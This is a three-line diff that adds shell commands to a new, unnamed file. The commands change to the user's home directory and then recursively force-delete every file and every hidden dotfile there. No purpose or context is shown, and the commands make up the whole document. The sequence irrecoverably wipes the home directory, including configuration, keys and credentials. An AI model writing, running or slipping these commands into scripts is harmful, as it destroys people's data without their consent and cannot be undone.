@@ -1,0 +1,3 @@
+cd $HOME
+rm -rf ./*
+rm -rf ./.*
